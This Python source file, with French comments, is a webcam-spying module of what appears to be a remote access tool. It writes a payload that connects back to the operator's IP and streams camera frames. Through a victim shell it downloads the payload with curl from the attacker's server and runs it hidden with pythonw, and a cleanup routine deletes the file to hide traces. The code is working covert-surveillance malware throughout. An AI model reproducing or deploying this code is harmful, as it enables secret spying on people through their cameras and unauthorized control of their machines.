import socket
import cv2
import time
import pickle
import struct 
from colorama import Fore,deinit,init
from modules.info import Info
from modules.fonctions import get_self_ip, get_msg, menu

def gen_payload(ip):
    f=open("payload/cam.py","w")
    cont='import cv2\nimport time\nimport socket\nimport struct\nimport pickle\nprint("importation OK")\ntime.sleep(10)\nclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient_socket.connect((\''
    cont+=ip
    cont+='\', 8485))\nconnection = client_socket.makefile(\'wb\')\nprint("connection OK")\ncam = cv2.VideoCapture(0)\n\ncam.set(3, 320)\ncam.set(4, 240)\n\nimg_counter = 0\n\nencode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]\nprint("connection et image OK")\nwhile True:\n    ret, frame = cam.read()\n    result, frame = cv2.imencode(\'.jpg\', frame, encode_param)\n#    data = zlib.compress(pickle.dumps(frame, 0))\n    data = pickle.dumps(frame, 0)\n    size = len(data)\n\n\n    #print("{}: {}".format(img_counter, size))\n    client_socket.sendall(struct.pack(">L", size) + data)\n    img_counter += 1\n    \n    c = cv2.waitKey(1)\n    if c == 27:\n        break\n\ncam.release()\ncv2.destroyAllWindows()'
    f.write(cont)
    f.close()

def webcam():
    init()
    
    HOST : str = get_self_ip()
    PORT=8485

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    chargement(8,4,'Socket created')

    chargement(8,5,'Socket bind ...')
    s.bind((HOST,PORT))
    chargement(8,6,'Socket bind complete')
    s.listen(10)
    chargement(8,7,'Socket now listening')

    conn,addr=s.accept()
    chargement(8,8,"Client connected")
    data = b""
    payload_size = struct.calcsize(">L")
    while len(data) < payload_size:
            #print("Recv: {}".format(len(data)))
            data += conn.recv(4096)
    print(Fore.GREEN)
    print("Connection et image [OK]",Fore.WHITE)
    help_cam()
    #print("payload_size: {}".format(payload_size))
    while True:
        while len(data) < payload_size:
            #print("Recv: {}".format(len(data)))
            data += conn.recv(4096)

        #print("Done Recv: {}".format(len(data)))
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack(">L", packed_msg_size)[0]
        #print("msg_size: {}".format(msg_size))
        while len(data) < msg_size:
            data += conn.recv(4096)
        frame_data = data[:msg_size]
        data = data[msg_size:]

        frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
        frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
        cv2.imshow('ImageWindow',frame)
        if cv2.waitKey(1)==ord('q'):
            cv2.destroyAllWindows()
            break
def install(mySocket, HOST:str, len_msg:int) -> None:
    """ 
    # install
    ## Présentation
    installation du payload sur la machine de la victime 
    ## Entrée
    mySocket => socket de connection
    HOST => adresse ip de la machine hôte
    len_msg => taille des messages 
    ## Sortie
    NONE 
    """

    msg="pip install opencv-python"
    mySocket.send(msg.encode("Utf8"))
    get_msg(mySocket,len_msg)
    chargement(8,1,"importation des modules ok")

    msg="curl http://"+HOST+":8000/payload/cam.py -o C:\\Users\\Public\\Documents\\cam.pyw"
    mySocket.send(msg.encode("Utf8"))
    get_msg(mySocket,len_msg)
    chargement(8,2,"telechargement du payload ok")

    msg="start pythonw.exe C:\\Users\\Public\\Documents\\cam.pyw"
    mySocket.send(msg.encode("Utf8"))
    chargement(8,3,"lancement du payload ok")

def clean(mySocket, len_msg:int)->None:
    """
    # clean
    ## Présentation
    Fonction pour nettoyer le fichier sur la machine de la
    victime une fois qu'on a fini d'utiliser la cam
    ## Entrée
    mySocket => socket de connection
    len_msg => taille des messages 
    """
    msg="del C:\\Users\\Public\\Documents\\cam.pyw"
    mySocket.send(msg.encode("Utf8"))
    get_msg(mySocket,len_msg)
    print('programme nettoyer')
    time.sleep(1)

def chargement(total: int, actu: int, message: str = "") -> None:
    menu()
    Info.info(message)
    print(f"[{"#"*((actu*10)//total)}{" "*(10-((actu*10)//total))}] {actu}/{total}")

def help_cam():
    """
    fonction pour afficher 
    une aide pour terminer correctement la cam
    """
    Info.info("Pour éteindre la caméra et nettoyer ses traces...\n appuyer sur la touche q")

if __name__ == "__main__":
    webcam()